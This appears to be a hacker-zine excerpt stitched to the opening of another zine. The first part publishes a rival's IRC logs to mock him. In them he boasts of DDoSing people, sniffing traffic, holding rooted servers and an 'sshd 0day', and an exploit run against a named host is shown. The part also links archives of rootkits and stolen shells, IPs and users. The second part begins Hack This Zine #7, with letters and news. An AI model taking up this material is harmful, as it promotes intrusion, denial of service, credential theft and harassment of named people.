<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :owns my dsl
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :real leet
-> PRIVMSG d0n :who ?
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :that d0n guy
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :had my nick
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :was talking shit
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :""here comes the ddos"" he said
-> PRIVMSG d0n :fuck
-> PRIVMSG d0n :lets hack him
-> PRIVMSG d0n :not hard target
-> PRIVMSG d0n :hehehe
-> PRIVMSG d0n :to me
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :HHEHEHEEH\
-> PRIVMSG d0n ::>:>:>:>
-> PRIVMSG d0n :sup bitchx
-> PRIVMSG d0n ::>
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 ::)
-> PRIVMSG d0n :bitchx bugged
-> PRIVMSG d0n :do u use it ?
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :the client?
-> PRIVMSG d0n :yah
-> PRIVMSG d0n :0dayz
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :no shit..
-> PRIVMSG d0n :eheh

*********************** run to the hillz he h4s b1tchx 0d4y **********************

-> PRIVMSG d0n :i have windows on linux (vmware)                              ->>>>>>>>>>>>>>>>>>>>> lies
-> PRIVMSG d0n :hjmm
-> PRIVMSG d0n :;>
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :ah yeah
-> PRIVMSG d0n :omfg
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :any more fun with efnet soon?
-> PRIVMSG d0n :im still drunked
-> PRIVMSG d0n :no more
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :HEHE
-> PRIVMSG d0n :im stoped with x0x0x
<- :d0n!burnout@burnout.bitchx.org PRIVMSG r47 :;p
-> PRIVMSG d0n :just sniffing idiots now                                      ->>>>>>>>>>>>>>>>>>>> so we are

*********************** /laugh time ********************************************                               
-> PRIVMSG accuser :nem
-> PRIVMSG accuser :nao me comunico mais com povo br                          ->>>>>>>>>>>>>>>>>>>>
-> PRIVMSG accuser :nao eh meu nivel
-> PRIVMSG accuser :so alguns amigos
-> PRIVMSG accuser :nego roubo meu canal ontem                                ->>>>>>>>>>>>>>>>>>>> some guyz stole my network baby
-> PRIVMSG accuser :recuperei
-> PRIVMSG accuser :e tomei o nick deles                                      ->>>>>>>>>>>>>>>>>>>> i ddosed them and got their nicks
-> PRIVMSG accuser :/w psys                      
-> PRIVMSG accuser :/w dtr
-> PRIVMSG accuser :hehehe                                                    ->>>>>>>>>>>>>>>>>>>> now i feel gr8
<- :accuser!~psy@64.244.62.214 PRIVMSG r47 :eu vi
<- :accuser!~psy@64.244.62.214 PRIVMSG r47 :o psys tacando monte de bot
-> PRIVMSG accuser :comigo eh dificil um br poder                             ->>>>>>>>>>>>>>>>>>>> HAHAHAHAHAHAHAHAAHHAHAHAHAHAHAHAHA (12x)
-> PRIVMSG accuser :hehehe
-> PRIVMSG accuser :eu mando!                                                 ->>>>>>>>>>>>>>>>>>>> im THE guy!
-> PRIVMSG accuser :eu to mo fora de guerra cara
-> PRIVMSG accuser :mas parece q os caras me perseguem
-> PRIVMSG accuser :e sismam q sou lamer                                      ->>>>>>>>>>>>>>>>>>>> /me laughs
-> PRIVMSG accuser :rs

-> PRIVMSG sexybaby :itsme q_+T*/81_3|Z3g; r47                                ->>>>>>>>>>>>>>>>>>>> hiz botz, thanks for sharing
-> PRIVMSG sexybaby :op q_+T*/81_3|Z3g;
sexybaby on @#brasil @+#Sonya @#24/7 @+#prank @#unforgiven @#serious @#xanax  ->>>>>>>>>>>>>>>>>>>> 3h3h3h3

<- :KoaL4!h@216.75.56.186 PRIVMSG r47 :c vai me ajeita un trem que presta entum? ->>>>>>>>>>>>>>>>> gimm3 a b0x
-> PRIVMSG KoaL4 :cara
-> PRIVMSG KoaL4 :vou
-> PRIVMSG KoaL4 :mas nao me atrapalha
-> PRIVMSG KoaL4 :to aki programando
-> PRIVMSG KoaL4 :pra um cliente chato pra kct

<- :\g4br13l\!~ucvn@server3.erz.univie.ac.at PRIVMSG r47 :ta
<- :\g4br13l\!~ucvn@server3.erz.univie.ac.at PRIVMSG r47 :arrumando truta
<- :\g4br13l\!~ucvn@server3.erz.univie.ac.at PRIVMSG r47 :com os cara da defland pq
<- :\g4br13l\!~ucvn@server3.erz.univie.ac.at PRIVMSG r47 :?
-> PRIVMSG \g4br13l\ :falaram meu nome em vao
-> PRIVMSG \g4br13l\ :nao qro isso
-> PRIVMSG \g4br13l\ :so isso
<- :\g4br13l\!~ucvn@server3.erz.univie.ac.at PRIVMSG r47 :r47
<- :\g4br13l\!~ucvn@server3.erz.univie.ac.at PRIVMSG r47 :tu se esquenta
<- :\g4br13l\!~ucvn@server3.erz.univie.ac.at PRIVMSG r47 :com bobagem
-> PRIVMSG \g4br13l\ :hehee
<- :\g4br13l\!~ucvn@server3.erz.univie.ac.at PRIVMSG r47 :?
-> PRIVMSG \g4br13l\ :nao qro pivete
-> PRIVMSG \g4br13l\ :de merda
-> PRIVMSG \g4br13l\ :kiddie
-> PRIVMSG \g4br13l\ :falando de mim
-> PRIVMSG \g4br13l\ :pq qm manda                                       ----->>>>>>>>>>>>> HAHAHAHAHAHAHAHAHAHAHAHA
-> PRIVMSG \g4br13l\ :sou eu                                            ----->>>>>>>>>>>>> HAHAHAHAHAHAHAHAHAHAHAHA
-> PRIVMSG \g4br13l\ ::>
-> PRIVMSG \g4br13l\ :esse univie.ac.at eh show
-> PRIVMSG \g4br13l\ :tenho a www la
-> PRIVMSG \g4br13l\ ::>
-> PRIVMSG \g4br13l\ :usam checkpoint firewall one                      ----->>>>>>>>>>>>> what the fuck ?
-> PRIVMSG \g4br13l\ :tunnelling by trace                               ----->>>>>>>>>>>>> ?!?1
-> PRIVMSG \g4br13l\ :mto dificil pacota-la


*********************** boyfriends are fighting - portuguese only, sorry **********************
-> PRIVMSG #thc :skotch is gay
-> PRIVMSG skotch :eai vagabunda
-> PRIVMSG skotch :vai fica na putaria ateh qdo
-> PRIVMSG skotch :to cheio de novidades
-> PRIVMSG skotch :e para de me chamar de verme
-> PRIVMSG skotch :rs
<- ::skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :vai toma no meu do teu cuh rapa, n qro papo contigo e ve se para de fica mandando alerta no meu nextel -> gtfo
-> PRIVMSG skotch :ahahaha
-> PRIVMSG skotch :vc tem certeza                                     ->>>>>>>>> are you sure baby ?
-> PRIVMSG skotch :entao eh  isso ?
-> PRIVMSG skotch :ja era ?:
-> PRIVMSG skotch :ja era ?
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :sim
-> PRIVMSG skotch :eu nao vou voltar aki denovo
-> PRIVMSG skotch :pra falar com vc
-> PRIVMSG skotch :ja era ?
-> PRIVMSG skotch :CERTEZA?                                             ->>>>>>>> are you sure we are breaking apart?????
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :alias quem ta oltando aki direto eh vc, eu to na minha faz tempo
-> PRIVMSG skotch :to na minha tb
-> PRIVMSG skotch :so acho
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :vc fala merda e dps quer voltar a tras
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :coisa de mlk
-> PRIVMSG skotch :filho
-> PRIVMSG skotch :eu so acho
-> PRIVMSG skotch :q eh besteira
-> PRIVMSG skotch :agente brigasr por isso
-> PRIVMSG skotch :so isso
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :mermao n eh a primeira vez
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :q tu da dessas
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :vem falando bosta
:skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :e dps vem se desculpando
-> PRIVMSG skotch :so joguei um verde
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :n so esses verme de merda
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :q paga pau pra vc
-> PRIVMSG skotch :nao vou fazer isso denovo
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :q aceita tudo q vc fala
-> PRIVMSG skotch :whatever
-> PRIVMSG skotch :nao falei q tu paga sapo pra mim
-> PRIVMSG skotch :tu tb
-> PRIVMSG skotch :eh cheio das noia q nem eu
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :tu soh mostro q n confia
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :axando q eu passo maq pra xscholler
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :aff
-> PRIVMSG skotch :porra
-> PRIVMSG skotch :tu some
-> PRIVMSG skotch :so joguei um verde
-> PRIVMSG skotch :se nao confiasse
-> PRIVMSG skotch :tu nao tinha
-> PRIVMSG skotch :tds minhas box
-> PRIVMSG skotch :TODAS
-> PRIVMSG skotch :fdp
-> PRIVMSG skotch :outra coisa
-> PRIVMSG skotch :descobri
-> PRIVMSG skotch :o klux
-> PRIVMSG skotch :tem root na importec                    ->>>>>> klux has root in importec[their box] (you are right sir!)
-> PRIVMSG skotch :NAO USA MAIS ELA DE PONTE               ->>>>>> dont use it as bounce anymore! (kinda late)
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :n vem dessas q qdo mandei o skotch.txt tinha mta maq la q vc nem tinha ownado, q eu tinha ownado sozinho
-> PRIVMSG skotch :e varias box.. ele so troca o ssh binario
-> PRIVMSG skotch :pra sniffa
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :n to usando mais importec faz tempo
-> PRIVMSG skotch :fica ligeiro
-> PRIVMSG skotch :eu formatei ele
-> PRIVMSG skotch :deproposito
-> PRIVMSG skotch :ele veio no meu pvt
-> PRIVMSG skotch :colo uma pa de merda
-> PRIVMSG skotch :ele sabe da ig
-> PRIVMSG skotch :da locaweb
-> PRIVMSG skotch :da pop
-> PRIVMSG skotch :<skotch> n vem dessas q qdo mandei o skotch.txt tinha mta maq la q vc nem tinha ownado, q eu tinha ownado sozinho
-> PRIVMSG skotch :e vice versa
-> PRIVMSG skotch :q seja
-> PRIVMSG skotch :ouytra coisa
-> PRIVMSG skotch :peguei coisa quente
-> PRIVMSG skotch :sshd 
-> PRIVMSG skotch :hehehe
-> PRIVMSG skotch :remote expl
-> PRIVMSG skotch :openbsd local                      ->>>>>>>>>> y0y0 juz g0t a openbsd local (right, check it on milw0rm, asshole)
-> PRIVMSG skotch :tu fica de putaria
-> PRIVMSG skotch :agente perdendo tempo
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :o openbsd vc a mando faz tempo
-> PRIVMSG skotch :mas esse novo nao
-> PRIVMSG skotch :entra na merda do msn
-> PRIVMSG skotch :e para de putaria
-> PRIVMSG skotch :por besteira
-> PRIVMSG skotch :vou te desblokear                  ->>>>>>>>> i'll unblock ya from msn babe! plz come back !
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :to indo pro trampo
-> PRIVMSG skotch :vai para com a putaria de merda ?
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :quem fica de putaria eh vc, falando bosta sem saber de nada
-> PRIVMSG skotch : * 
-> PRIVMSG skotch : * eXstacy ~ # gcc sshexploit.c -o sshex -lssh
-> PRIVMSG skotch : * eXstacy ~ # ./sshex -h laggy.org -l xxxxx -d keys/             ->>>>>>> w0w, this is certainly a 0day, right ? /me rolling on the floor laughing
-> PRIVMSG skotch : * [!] KEY FOUND!
-> PRIVMSG skotch : * [!] Logging in...
-> PRIVMSG skotch : * Last login: Fri Aug 15 16:05:43 2008 from xxxxxxxxxxxxxxxxx
-> PRIVMSG skotch : * xxxxx@digitaljunk ~ $  
-> PRIVMSG skotch : *
-> PRIVMSG skotch : * Not that practical since it doesnt use threads, but the code shows 
-> PRIVMSG skotch : * howto make a ssh client from scratch using libssh for what purpose 
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :procura se informar primeiro antes de falar merda
-> PRIVMSG skotch :so joguei verde
-> PRIVMSG skotch :sou noiado
-> PRIVMSG skotch :vc tb he
-> PRIVMSG skotch :normal
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :esse ai eh um bruteforce q usa um bug do ssh
-> PRIVMSG skotch :nao fiz mal nenhum pra vc
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :pode demorar horas pra achar a key certa
-> PRIVMSG skotch :nao
-> PRIVMSG skotch :de 5 a 10 min
-> PRIVMSG skotch :o coideloko ja ta melhorando ele
-> PRIVMSG skotch :pra demorar menos
-> PRIVMSG skotch :hehe
-> PRIVMSG skotch :a oi ta bugada
-> PRIVMSG skotch :ele FUNCIONA
-> PRIVMSG skotch :e jaja
-> PRIVMSG skotch :to com 0day pra samba
-> PRIVMSG skotch :aguarde
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :so falo
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :pra vc fica esperto
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :q tem gringo
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :te sniffando
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :pq fikei sabendo
-> PRIVMSG skotch :ta loko ?
-> PRIVMSG skotch :so se for na bnc
-> PRIVMSG skotch :hehehe
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :nego q ta falando com vc
-> PRIVMSG skotch :ateh entao nao ligo
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :soh pra causar intriga
-> PRIVMSG skotch :porra
-> PRIVMSG skotch :tu eh meu amigo ou nao eh :?
-> PRIVMSG skotch :<skotch> so falo
-> PRIVMSG skotch :<skotch> pra vc fica esperto
-> PRIVMSG skotch :<skotch> q tem gringo
-> PRIVMSG skotch :<skotch> te sniffando
-> PRIVMSG skotch :<skotch> pq fikei sabendo
-> PRIVMSG skotch :qm sniffando ?
-> PRIVMSG skotch :skotch
-> PRIVMSG skotch :fala krl
-> PRIVMSG skotch :skotch
-> PRIVMSG skotch :skotch
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :to comend mermao
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :e to atrasado pro trampo
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :flw
-> PRIVMSG skotch :cara
-> PRIVMSG skotch :se tu continuar folgado
-> PRIVMSG skotch :naovaidar
-> PRIVMSG skotch :vai sew fude
-> PRIVMSG skotch :fala direito
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :isso eh facil de vc descobrir, so vc ver quem se aproximo de vc
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :ultimamente
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :e n trocava ideia antes
<- :skotch!~skotch@d0nt.bl4m3.4.l33tzor.org PRIVMSG r47 :so vc pensar
-> PRIVMSG skotch :whatever
-> PRIVMSG skotch :vc
-> PRIVMSG skotch :e o thomaz
-> PRIVMSG skotch :sao os unicos
-> PRIVMSG skotch :q tem as m erda q tenho
-> PRIVMSG skotch :UNICOS
-> PRIVMSG skotch :mais ngm tem
-> PRIVMSG skotch :nao confio em m ais NGM
-> PRIVMSG skotch :eu acho q tu deveria me falar qm eh
-> PRIVMSG skotch :so isso
-> PRIVMSG skotch :e troquei de bnc ontemrs
-> PRIVMSG skotch :e troquei de bnc ontem rs                         ->>>>>> i changed my bnc yesterday! (we're glad)
-> PRIVMSG rip :skotch said to me that are sniffing me
-> PRIVMSG rip :but skotch dont know about nothing                   ->>>>>> as always, backstabbing hiZ boyfriend(skotch)


/*
 * Geminid IIb. TCP/UDP/ICMP Packet flooder
 *
 * What can i say? Enjoy! :)
 * gr33tz: PoWerPr0 and godmode0
 *

thanks for the gem source by the way!

>>> there could be more logs, but some kool guyz cant stop ddosing r47, so this is kind of boring to do
>> anyway, if we get something else in the future, we will publish again. thanks buddies.
> random logs if you have nothing to do: http://labsec.elite.vc/r47-1.log http://labsec.elite.vc/r47-2.log

##########################################################################
#       __                 __                __   __                     #
#.----.|  |--.---.-.-----.|  |_.-----.----. |  |_|  |--.----.-----.-----.#
#|  __||     |  _  |  _  ||   _|  -__|   _| |   _|     |   _|  -__|  -__|#
#|____||__|__|___._|   __||____|_____|__|   |____|__|__|__| |_____|_____|#
#                  |__|                                                  #
#                                                                        #
# - download links                                                       #
##########################################################################

<><> thiZ iZ ZeRIouZ buZInEzZ dewD!
<><> http://labsec.elite.vc/x0x0x-suckY-sshd.tar.bz2
<><> http://labsec.elite.vc/x0x0x-suckY-phalanx-suckit.tar.bz2
<><> http://labsec.elite.vc/x0x0x-suckY-shells-ips-users-allinone.tar.bz2 [we are not sharing all of them, just some random ones]

<><> please guyZ, make it priv8 ! (/me rolleyes :B)

- kool&klean chapter.

##########################################################################
#              _               _              ___                        #
#         ___ | |_  ___  ___ _| |_ ___  _ _  | | '___  _ _  _ _          #
#        / | '| . |<_> || . \ | | / ._>| '_> | |-/ . \| | || '_>         #
#        \_|_.|_|_|<___||  _/ |_| \___.|_|   |_| \___/`___||_|           #
#                       |_|                                              #
#                                                                        #
# - conclusion                                                           #
##########################################################################


----------------- reflection time
>.......... whats the point of all this ? prove that you are better than someone ?
>......... what a joke. just coz you are lucky and had the chance it doesnt mean you are bl4ckh47.
>........ your zines are pathetic. what the fuck is this 'messages' shit in the bottom of them ?
>....... like you are able to hack someone by yourself, eh ? you cant do shit x0x0x, you ARE shit.
>...... why thank soldiers and all blackhats? you dont belong to any of them, none of them like you.
>..... why would someone send you a mail? nobody cares about you, dipshit.
>.... i cant really believe that you spent time creating a new mail just koz of your second shit zine, hahahahaha what a joke
>... stop playing hacker, you are not hacker, - we are not hackers -, you cant even do shellscript, get a life while you can.
>.. a kiss to zmda
>. think twice before you fuck with us, asshole. we know you, we know what you can do, and we know what you cant do.
> just to finish:

******************************** m355 w17h 7h3 beZt - diE liKE th3 r3s7 ********************************
;
;
; _____          __     _______             
;|     |_.---.-.|  |--.|     __|.-----.----.
;|       |  _  ||  _  ||__     ||  -__|  __|
;|_______|___._||_____||_______||_____|____|
;                                           
; _______           __               __         __              
;|_     _|.-----.--|  |.--.--.-----.|  |_.----.|__|.-----.-----.
; _|   |_ |     |  _  ||  |  |__ --||   _|   _||  ||  -__|__ --|
;|_______||__|__|_____||_____|_____||____|__|  |__||_____|_____|
;                                                               ;
;
; #LABSEC @ EFNET - closed to friends, of course.
;
; klux/djow - include - input - r3n4t0 - memelo - deadcow - w3b - kernel` - kylebond - fseek
;
; lAmE ZiNE wRitTeN bY:
;
; klux - spoof1 @RR0B@ gmail.com - hAppY flOodiNg
;
;
; wE iZ watCHiNg U
******************************** m355 w17h 7h3 beZt - diE liKE th3 r3s7 ********************************"
Papers,HackThisZine (HTZ) #7,eZine,,2009-06-21,: N/A,"""You want a seriously righteous hack you score one of those Gibsons man. You 
know super computers they use to do physics and look for oil and stuff  ... Oh 
man Wouldn't you just love to get one of those Gibsons, baby!"" 
?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!
################################################################################

           __-----_.                            .-------------------.
          /  \      \     o  o  o  O  O  O     (  HACK THIS ZINE #7  )
         /    |  | | \___      ._.             (     SUMMER 2009     )
        |     |----------\     | |"""""""""""""".     (   HACK THE GIBSON   )
        |     |\ bloc up /     | |        ""     -___________________-
         \___/  \ homie /      | |         ""   
           \     \_____/       | |          ""  
            | |                | |          |
           /   \-_             | |         |'
         /      \_ ""__ _       !_!--v---v--""
        /         ""|  |>)      |""""""""""""""""|
       |          _|  | ._--""""||        |.- -. .- .-. -.-. .... .. ... -- 
       _\_____________|_|_____||________|_

secret openssh 0day release issue - proof of concept code below - no seriously!!
################################################################################

                    Hack This Zine #7  :  Hack The Gibson
                      Summer 2009  :  staff@hackbloc.org
                      
                           table of (dis)contents:
                      ->Meta 
                         1 Letters 
                         2 News in the Briefs 
                      -->Tech 
                         3 Hacking Your GPS 
                         4 Alternative PHP Include Attacks 
                         5 Hiding from the man: Apache Obfuscation 
                         6 Sucking Signal 
                         7 Hardware Hacking 
                      -->Philotics 
                         8 Tech vs Industry 
                         9 Copwatch 2.0 
                      -->EOF 

################################################################################

but first a message from our blackhat overlords, cause if you didn't dig it 
then then you better dig it now:

  ""Full-disclosure is the disclosure of exploits publicly - anywhere. The 
  security industry uses full-disclosure to profit and develop scare-tactics
  to convince people into buying their firewalls, anti-virus software, and
  auditing services.
	...
  It is our goal that, through mayhem and the destruction of all
  exploitive and detrimental communities, companies, and individuals,
  full-disclosure will be abandoned and the security industry will be 
  forced to reform.     
    ...
  This isn't like before. This time everyone and everything is getting owned.
  Signed: The Anti-sec Movement"" - the latest revival of pr0j3kt m4yh3m and el8, 
  h0no, dikline, zfo, etc.

################################################################################
# 1. LETTERS                                                                   #
################################################################################

From: Rhonda 
site was down earlier eh...nice to see you back up. 
http://securityforthemasses.blogspot.com/2009/03/hackbloc-down.html 
Regards 

Yea, apparently we had some issues with our server this month, 2 tips for using 
the rm command.  Don't use it with the * operator, and don't use it while tired, 
or drunk. 

From: Wan_Hacker 
I have problem on my computer. when I put my pen drive password box pop out. how 
to settle this prob 

Try entering a password? Alternatively, you could format the drive. Or see above 
for a tutorial on the rm -rf command. 

From: Salchoman   hey, i'm from Colombia and i'd love to help you translating, 
mail me if i can help u :] 
From: salcho    Hey, it would be great to help you translating htz to spanish! 
would it be of any help? 
Hey HackBloc! I'll start translating it right over, I'll start with number 6. Is 
that all right? 

Thats great! And you don't (nor does anyone else) need to ask our 
permission to translate.  :)  We would love any translations that anyone can do! 
All translations are welcomed and very helpful for non english speakers.  Please 
if you can translate any and all issues (especially the most recent ones). We 
will appreciate it very much, we will try to send you some free issues and give 
you credit in the zine!  Plus if you can translate issues, we will send you 
future issues before we publish them, so that you can translate those if you
like!  If you make translations please send them to the hack this zine mailing 
list or to staff@hackbloc.org 

From: Wine Skeem <wannest@boiiom.com> 
This iss your penis: 8--o 
This iss your penis on drugs: 8=====O 
Any quuestions? Wine Skeem, 

First of all: Sick ascii art! Second of all: Sorry, those of us with penises 
have straight edge penises and we would appreciate it if you and your friends 
would stop peddling your dope on our bandwidth. Third of all: we would 
appreciate it if all future email regarding penises would be encrypted you can 
find out public key at http://hackbloc.org/etc/hbStaffPubkey.txt 

Subject: Can She Have Multiplle Orgasms? 
From: Glimp Cypher <saurischian@lan-ev.org> 
Do you want to be seen as a capptain of the bedroom? Do you want your woman to 
be RAVING to her friends about the great sex she has while all of them get 
normal boring sex? Well if you do, then you deffinitely need to ... 
Glimp Cypher, 

We don't want to be captain of the bedroom, maybe more something like 
""Caaaaaaptain Caveman!""  What's all this sex stuff, we don't have sex, we work
on our sick monitor tans.  PS, please don't tell me you took any of that shit
that Wine skeem was pushing.  Your penis is going to turn into some ascii art 
matching the regular expression /8=+0/


################################################################################
# 2. NEWS IN THE BRIEFS!                                                       #
################################################################################

US Federal Prisons start rolling out TRULINCS email system
------------------------------------------------------------
Select federal prisons have been trying out heavily restrictive computer systems 
allowing prisoners to correspond via email. The system charges by the minute, 
strips all html/attachments. The BOP expects the system to be available in all 
federal prisons by June 2011.

The BOP website provides some information about TRULINCS. Not surprisingly, they 
confirm all communications are monitored, which is possibly the whole purpose of 
the program (physical mail is difficult and inefficient to monitor and store 
into searchable databases).

Inmates must initiate communication and get approval of both the receiver and 
prison staff (similar to visitor lists). Emails originate from <register 
number>@inmatemessage.com.

http://www.bop.gov/inmate_programs/trulincs_faq.jsp

p2pnet Wins Free Speech Supreme Court Case in Canada
----------------------------------------------------
In 2006 and 2007, former Green Party organizer and Vancouver businessmen Wayne 
Crookes has filed lawsuits against several websites including Google and 
Wikimedia alleging that they had 'published' defamatory content. Also charged 
was p2pnet who had been accused of simply linking to several defamatory 
websites.

In a October 27, 2008 decision, Judge Stephen Kelleher threw out the case, 
stating ""Although a hyperlink provides immediate access to material published on 
another website, this does not amount to republication of the content on the 
originating site. This is especially so as a reader may or may not follow the 
hyperlinks provided.""

http://www.p2pnet.net/story/17398
http://torrentfreak.com/p2pnet-wins-landmark-hyperlink-case-081029/

Facebook terms and services agreement
-------------------------------------
Facebook's Terms of Use ""grants Facebook an irrevocable, perpetual, 
non-exclusive, transferable, fully paid, worldwide license (with the right to 
sublicense) to (a) use, copy, publish, stream, store, retain, publicly perform 
or display, transmit, scan, reformat, modify, edit, frame, translate, excerpt, 
adapt, create derivative works and distribute"" etc etc.

For a brief period of time, Facebook changed it's TOS to allow them to use all 
your information after you remove your sign up information; they were forced to 
revert to the old TOS because of a public backlash. Of course, you cannot trust 
any information you put online, especially to a major corporation such as 
Facebook. 

People who are concerned about privacy and security should consider using 
Riseup's Crabgrass social networking system at http://we.riseup.net

Cuba Claims US Gov Backdoors in Windows, Develops Custom Linux Variant
-----------------------------------------------------------------------------
The majority of computer systems in Cuba are running Windows; the government 
hopes to change this by developing and releasing their own customized version of 
Linux called 'Nova' (which appears to be a customized version of Gentoo). 
Amongst it's reasons for transitioning to Linux they claim that US Government 
agencies may have access to backdoors built into Microsoft code and that it is 
difficult to obtain legal Windows copies because of the US Trade embargo.

""I would like to think that in five years our country will have more than 50 
percent migrated,"" dean of the School of Free Software Hector Rodriguez stated.

http://techdirt.com/articles/20090212/1347183753.shtml

Labor Report: ""Dehumanization of Young Workers Producing our Computer Keyboards""
-------------------------------------------------------------------------------
An undercover investigation has revealed atrocious working conditions in the 
Meitai factory in southern China, which mass produces keyboards for american 
corporations such as IBM, Microsoft, Dell, HP, and Lenovo. The report is very 
comprehensive and includes pictures from within the facility. Here is an 
excerpt:

* The workers are paid 1/50th of a cent for each operation.
* The assembly line never stops, and workers needing to use the bathroom must 
learn to hold it until there is a break.
* All overtime is mandatory, with 12-hour shifts seven days a week and an 
average of two days off a month.  A worker daring to take a Sunday off—which is 
supposedly their weekly holiday—will be docked 2 % days' wages.  Including 
unpaid overtime, workers are at the factory up to 87 hours a week.  On average, 
they are at the factory 81 hours a week, while toiling 74 hours, including 34 
hours of overtime, which exceeds China's legal limit by 318 percent!
* The workers are paid a base wage of 64 cents an hour, which does not even come 
close to meeting subsistence level needs.  After deductions for primitive room 
and board, the workers' take-home wage drops to just 41 cents an hour.  A worker 
toiling 75 hours a week will earn a take-home wage of $57.19, or 76 cents an 
hour including overtime and bonuses.  The workers are routinely cheated of 14 to 
19 percent of the wages legally due them.
* Ten to twelve workers share each crowded dorm room, sleeping on narrow metal 
bunk beds that line the walls.  They drape old sheets over their cubicle 
openings for privacy.  In the winter, workers have to walk down several flights 
of stairs to fetch hot water in a small plastic bucket, which they carry back to 
their rooms to take a sponge bath.  In the summer, dorm temperatures reach into 
the high 90s.
* Workers are locked in the factory compound four days a week and are prohibited 
from even taking a walk.
* To symbolize their ""improving lives"" the workers are served a special treat on 
Fridays—a small chicken leg and foot.  For breakfast, they are given watery rice 
gruel.  The workers say the food has a bad taste and is ""hard to swallow.""
* Illegally, workers are not inscribed in the mandatory work injury and health 
insurance and Social Security maternity leave program.  In the Molding 
department, due to the excessive heat, the workers suffer skin rashes on their 
faces and arms.
* One worker summed up the general feeling in the factory:  ""I feel like I am 
serving a prison sentence.""

Read the Full Report:   http://www.nlcnet.org/article.php?id=613

http://www.nlcnet.org/admin/media/images/China/2009%20meitai%20factory/images/
workers%20inserting%20keys.jpg
[caption: chinese sweatshop producing keyboards for american corporations]

http://www.nlcnet.org/admin/media/images/China/2009%20meitai%20factory/images/
lunch%20line%20from%20back.jpg
[picture: workers in uniform line up for watery rice gruel breakfast]

Corporate Contact Information:

Lenovo / U.S. Office
1009 Think Place / Morrisville, North Carolina 27560    /  Phone: 866-968-4465        
President and CEO: Mr. William J. Amelio    Director of the Board: Yang Yuanqing

Hewlett-Packard Company
3000 Hanover Street / Palo Alto, CA 94304-1112 / 650-857-1501 / Fax 650-857-5518

International Business Machines Corp.
1 New Orchard Road / Armonk, NY 10504-1722  / 914-499-1900 / Fax: 914-765-7382
E-mail: sam at us.ibm.com (CEO Samuel Palmisano's e-mail address)

Dell Inc.
One Dell Way / Round Rock, TX 78682 / Phone: 512-728-4100 / Fax: 512-238-2773

Microsoft Corporation
One Microsoft Way / Redmund, WA 98052-6399 / 425-882-8080 / Fax: 425-936-7329

Recent Hacktivist Actions:
--------------------------

Hackers Against Oppression launch electronic civil disobedience actions in 
solidarity with Greece Riots
--------------------------------------------------------------------------------

While the streets of Greece went up in flames in protest of the police murder of 
anarchist youth Alexandros Grigoropoulos, a group of hackers calling themselves 
Hackers Against Oppression have organized an electronic civil disobedience 
action releasing sit-in scripts attacking Greek government websites. Here is an 
excerpt from their communique:

  ""Hackers Against Oppression have called for Electronic Civil Disobedience in 
  Solidarity with Greek Anarchists on Wednesday Dec 31, the final day of 
  December. December is the month in which Alexandros Grigoropoulos, a
